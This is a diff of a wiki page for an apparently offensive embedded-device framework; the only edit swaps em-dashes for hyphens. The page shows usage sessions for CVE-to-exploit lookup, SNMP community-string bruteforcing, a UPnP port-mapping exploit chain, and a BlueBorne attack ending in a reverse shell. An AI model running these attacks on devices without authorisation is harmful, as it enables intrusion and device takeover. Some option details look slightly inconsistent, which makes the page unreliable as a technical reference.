@@ -6,7 +6,7 @@
 
 ## Overview
 
-Generic modules operate across vendors and device classes — they target common protocols and services rather than vendor-specific vulnerabilities. They are located under `embedxpl/modules/generic/` and loaded with the standard `use` command.
+Generic modules operate across vendors and device classes  -  they target common protocols and services rather than vendor-specific vulnerabilities. They are located under `embedxpl/modules/generic/` and loaded with the standard `use` command.
 
 ---
 
@@ -50,7 +50,7 @@ Generic modules operate across vendors and device classes — they target common
 
 At least one of `vendor`, `product`, or `banner` is required.
 
-### Terminal session — CVE lookup by vendor and product
+### Terminal session  -  CVE lookup by vendor and product
 
 ```text
 exf > use generic/cve/cve_lookup
@@ -76,7 +76,7 @@ exf (CVE Lookup by Banner / Vendor / Product) > run
 │ CVE-2022-42475   │ 9.3  │ REMOTE │ FortiOS SSL-VPN heap overflow (XORtigate)                                │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_heap_rce_cve_2022_42475     │
 │ CVE-2022-40684   │ 9.8  │ REMOTE │ FortiOS authentication bypass via crafted HTTP/HTTPS request             │ YES      │ exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684         │
 │ CVE-2024-50562   │ 8.1  │ REMOTE │ FortiOS SSL-VPN session token reuse                                      │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_session_reuse_cve_2024_50562│
-│ CVE-2022-40682   │ 7.8  │ REMOTE │ FortiOS SSL-VPN session token reuse (older variant)                      │ NO       │ —                                                                      │
+│ CVE-2022-40682   │ 7.8  │ REMOTE │ FortiOS SSL-VPN session token reuse (older variant)                      │ NO       │  -                                                                       │
 │ CVE-2023-27997   │ 9.8  │ REMOTE │ FortiOS SSL-VPN heap overflow (XORtigate pre-auth RCE)                   │ YES      │ exploits/firewalls/fortinet/fortios_heap_overflow_rce_cve_2023_27997   │
 │ CVE-2018-13379   │ 9.8  │ REMOTE │ FortiOS SSL-VPN path traversal exposes credentials                       │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379│
 └──────────────────┴──────┴────────┴──────────────────────────────────────────────────────────────────────────┴──────────┴────────────────────────────────────────────────────────────────────────┘
@@ -85,7 +85,7 @@ exf (CVE Lookup by Banner / Vendor / Product) > run
 [*] Tip: set remote_only false to include LOCAL/PHYSICAL CVEs.
 ```
 
-### Terminal session — CVE lookup by raw banner
+### Terminal session  -  CVE lookup by raw banner
 
 ```text
 exf (CVE Lookup by Banner / Vendor / Product) > set vendor ""
@@ -103,13 +103,13 @@ exf (CVE Lookup by Banner / Vendor / Product) > run
 ├──────────────────┼──────┼────────┼──────────────────────────────────────────────────┼──────┼─────────────────────────────────────────────────────────┤
 │ CVE-2016-6277    │ 9.8  │ REMOTE │ Netgear R7000 unauthenticated command injection   │ YES  │ exploits/routers/netgear/r7000_cmd_injection_cve_2016_6277│
 │ CVE-2021-45732   │ 8.8  │ REMOTE │ Netgear R7000 authenticated RCE                  │ YES  │ exploits/routers/netgear/r7000_auth_rce_cve_2021_45732  │
-│ CVE-2019-20760   │ 7.5  │ REMOTE │ Netgear R7000 network stack info leak            │ NO   │ —                                                       │
+│ CVE-2019-20760   │ 7.5  │ REMOTE │ Netgear R7000 network stack info leak            │ NO   │  -                                                        │
 └──────────────────┴──────┴────────┴──────────────────────────────────────────────────┴──────┴─────────────────────────────────────────────────────────┘
 
 [*] Total: 3 matching CVEs shown (2 with exf modules).
 ```
 
-### Terminal session — CVE lookup by version
+### Terminal session  -  CVE lookup by version
 
 ```text
 exf (CVE Lookup by Banner / Vendor / Product) > set vendor cisco
@@ -165,7 +165,7 @@ exf (CVE Lookup by Banner / Vendor / Product) > run
 
 **Built-in community strings:** `public`, `private`, `community`, `admin`, `manager`, `monitor`, `default`, `cisco`, `router`, `switch`, `secret`, `password`, `read`, `write`, `snmp`, `network`, `guest`, `test`, `internal`, `access`, `0`, `1234`, `cable-docsis`, `ILMI`
 
-### Terminal session — SNMP bruteforce
+### Terminal session  -  SNMP bruteforce
 
 ```text
 exf > use generic/snmp/snmp_bruteforce
@@ -186,15 +186,15 @@ Target options:
 exf (SNMP Community String Bruteforce) > run
 [*] Running module ...
 [*] Testing 24 community strings against 192.168.1.1:161 (SNMPv2c)...
-[-] Community 'private'  — no response
-[+] Community 'public'   — READ access confirmed
+[-] Community 'private'   -  no response
+[+] Community 'public'    -  READ access confirmed
     sysDescr: Linux router 4.14.195 #1 SMP Mon Mar 8 07:05:38 UTC 2021 mips
     sysName:  TP-LINK_Router
     sysUpTime: 14d 7h 23m 15s
-[-] Community 'cisco'    — no response
-[-] Community 'admin'    — no response
-[+] Community 'manager'  — READ+WRITE access confirmed (community grants write!)
-[!] WRITE community found — device configuration may be modifiable via SNMP SET
+[-] Community 'cisco'     -  no response
+[-] Community 'admin'     -  no response
+[+] Community 'manager'   -  READ+WRITE access confirmed (community grants write!)
+[!] WRITE community found  -  device configuration may be modifiable via SNMP SET
 
 [*] Summary:
     READ  communities: public, manager
@@ -202,7 +202,7 @@ exf (SNMP Community String Bruteforce) > run
     Device: TP-Link TL-WR941N (Linux 4.14.195, MIPS)
 ```
 
-### Terminal session — using custom wordlist
+### Terminal session  -  using custom wordlist
 
 ```text
 exf (SNMP Community String Bruteforce) > set wordlist /opt/wordlists/snmp-communities.txt
@@ -212,13 +212,13 @@ exf (SNMP Community String Bruteforce) > run
 [*] Loaded 842 community strings from /opt/wordlists/snmp-communities.txt
 [*] Testing against 192.168.1.1:161...
 ...
-[+] Community 'TP-Link_mgmt_2024' — READ access confirmed
+[+] Community 'TP-Link_mgmt_2024'  -  READ access confirmed
 ```
 
 ### Error cases
 
 ```text
-[!] Could not load wordlist: /opt/wordlists/missing.txt — [Errno 2] No such file or directory
+[!] Could not load wordlist: /opt/wordlists/missing.txt  -  [Errno 2] No such file or directory
 [*] Falling back to built-in 24-entry list
 ```
 
@@ -245,7 +245,7 @@ exf (SNMP Community String Bruteforce) > run
 | `timeout` | `OptPort` | No | `60` | seconds | Listener timeout (0 = run indefinitely) |
 | `community` | `OptString` | No | `public` | string | SNMP community filter (empty = accept all) |
 
-### Terminal session — SNMP trap listener
+### Terminal session  -  SNMP trap listener
 
 ```text
 exf > use generic/snmp/snmp_trap_listener
@@ -289,7 +289,7 @@ exf (SNMP Trap Listener) > run
 | `timeout` | `OptPort` | No | `5` | seconds | Listen window |
 | `service` | `OptString` | No | `ssdp:all` | UPnP service type | Filter by service type |
 
-### Terminal session — SSDP M-SEARCH
+### Terminal session  -  SSDP M-SEARCH
 
 ```text
 exf > use generic/upnp/ssdp_msearch
@@ -328,7 +328,7 @@ exf (SSDP M-SEARCH) > run
 | `test_port` | `OptPort` | No | `31337` | 1-65535 | External port to test AddPortMapping |
 | `skip_dangerous` | `OptBool` | No | `False` | `true/false` | Skip ForceTermination (WAN disconnect DoS) |
 
-### Terminal session — IGD exploit chain
+### Terminal session  -  IGD exploit chain
 
 ```text
 exf > use generic/upnp/igd_exploit
@@ -350,7 +350,7 @@ exf (UPnP IGD Exploit) > run
 [+] Port mapping 0: TCP/22 -> 192.168.1.10:22 (SSH internal)
 [+] Port mapping 1: TCP/3389 -> 192.168.1.20:3389 (RDP internal)
 [*] Stage 6: AddPortMapping (TCP/31337 -> 192.168.1.1:80, no auth)...
-[+] Port mapping added: TCP/0.0.0.0:31337 -> 192.168.1.1:80 (CRITICAL — firewall rule added without auth)
+[+] Port mapping added: TCP/0.0.0.0:31337 -> 192.168.1.1:80 (CRITICAL  -  firewall rule added without auth)
 [*] Stage 7: DeletePortMapping (cleanup test rule)...
 [+] Port mapping TCP/31337 removed
 [*] Stage 8: GetStatusInfo...
@@ -360,8 +360,8 @@ exf (UPnP IGD Exploit) > run
     PacketsSent: 4532111, PacketsReceived: 8123456
     WANAccessType: DSL, Layer1UpstreamMaxBitRate: 20000000
 [*] Stage 10: Event SUBSCRIBE (WAN state monitoring)...
-[+] Subscribed to WAN state events — SID: uuid:a1b2c3d4-e5f6-7890-abcd-ef1234567890
-[*] Stage 11: ForceTermination — SKIPPED (skip_dangerous=True)
+[+] Subscribed to WAN state events  -  SID: uuid:a1b2c3d4-e5f6-7890-abcd-ef1234567890
+[*] Stage 11: ForceTermination  -  SKIPPED (skip_dangerous=True)
 
 [*] IGD Exploitation Summary for 192.168.1.1:
     External IP disclosure:   YES (203.0.113.45)
@@ -387,7 +387,7 @@ exf (UPnP IGD Exploit) > run
 | `max_length` | `OptInteger` | No | `32` | 1-64 | Maximum password length |
 | `include_mac` | `OptString` | No | `""` | MAC address | Include MAC-derived passwords (last 6 chars, lower/upper) |
 
-### Terminal session — vendor-specific wordlist
+### Terminal session  -  vendor-specific wordlist
 
 ```text
 exf > use generic/wordlist/wordlist_generator
@@ -420,7 +420,7 @@ Located under `exploits/ics/bluetooth_ble/`, these modules target wireless proto
 | `wifi_kr00k_attack_cve_2019_15126` | CVE-2019-15126 | Kr00k Wi-Fi chip decrypt vuln (Broadcom/Cypress) |
 | `wifi_krack_attack_cve_2017_13077` | CVE-2017-13077 | KRACK WPA2 key reinstallation |
 
-**Options — `blueborne_attack_cve_2017_0781`:**
+**Options  -  `blueborne_attack_cve_2017_0781`:**
 
 | Parameter | Type | Required | Default | Accepted values | Description |
 |-----------|------|----------|---------|-----------------|-------------|
@@ -428,7 +428,7 @@ Located under `exploits/ics/bluetooth_ble/`, these modules target wireless proto
 | `interface` | `OptString` | No | `hci0` | hciN | Local Bluetooth adapter |
 | `timeout` | `OptPort` | No | `30` | seconds | Attack timeout |
 
-### Terminal session — BlueBorne (CVE-2017-0781)
+### Terminal session  -  BlueBorne (CVE-2017-0781)
 
 ```text
 exf > use exploits/ics/bluetooth_ble/blueborne_attack_cve_2017_0781
@@ -439,12 +439,12 @@ exf (BlueBorne RCE CVE-2017-0781) > set interface hci0
 exf (BlueBorne RCE CVE-2017_0781) > check
 [*] Checking Bluetooth reachability for AA:BB:CC:DD:EE:FF on hci0...
 [+] Device reachable (name: HUAWEI_P30_lite, class: Phone)
-[+] Android 8.0 detected — target is vulnerable to CVE-2017-0781 (BlueBorne)
+[+] Android 8.0 detected  -  target is vulnerable to CVE-2017-0781 (BlueBorne)
 exf (BlueBorne RCE CVE-2017_0781) > run
 [*] Running module ...
 [*] Stage 1: Sending malformed L2CAP request to trigger heap overflow...
 [*] Stage 2: Heap spray with shellcode targeting bluetoothd process...
-[+] Shellcode execution confirmed — bluetoothd crashed and restarted with injected code
+[+] Shellcode execution confirmed  -  bluetoothd crashed and restarted with injected code
 [*] Stage 3: Reverse shell callback...
 [+] Connection received from AA:BB:CC:DD:EE:FF
 $ id
@@ -464,10 +464,10 @@ exf (ExploitDB Embedded Lookup) > set query "FortiOS SSL-VPN"
 exf (ExploitDB Embedded Lookup) > run
 [*] Running module ...
 [*] Querying Exploit-DB for: FortiOS SSL-VPN
-[+] EDB-ID 51032 — Fortinet FortiOS 7.0.x SSL-VPN Heap Overflow — CVE-2022-42475
+[+] EDB-ID 51032  -  Fortinet FortiOS 7.0.x SSL-VPN Heap Overflow  -  CVE-2022-42475
     Type: Remote, Date: 2022-12-15, Author: Horizon3
     URL: https://www.exploit-db.com/exploits/51032
-[+] EDB-ID 50009 — FortiOS SSL-VPN path traversal — CVE-2018-13379
+[+] EDB-ID 50009  -  FortiOS SSL-VPN path traversal  -  CVE-2018-13379
     Type: Remote, Date: 2021-08-06
     URL: https://www.exploit-db.com/exploits/50009
 ```
@@ -516,11 +516,11 @@ exf (DNS Hijack Detector) > run
 [*] Running module ...
 [*] Querying DNS server at 192.168.1.1...
 [*] Resolving known-safe domains: google.com, microsoft.com, amazon.com
-[+] google.com -> 142.250.80.46 (expected: valid Google IP — OK)
-[!] microsoft.com -> 192.168.1.50 (expected: Microsoft IPs — POSSIBLE HIJACK!)
+[+] google.com -> 142.250.80.46 (expected: valid Google IP  -  OK)
+[!] microsoft.com -> 192.168.1.50 (expected: Microsoft IPs  -  POSSIBLE HIJACK!)
 [!] DNS hijack detected: microsoft.com -> 192.168.1.50 (local IP)
 [+] Checking for DNS rebinding vulnerability...
-[!] Rebinding test: external domain resolves to 192.168.1.1 — REBINDING POSSIBLE
+[!] Rebinding test: external domain resolves to 192.168.1.1  -  REBINDING POSSIBLE
 ```
 
 [Wiki hub](../README.md)
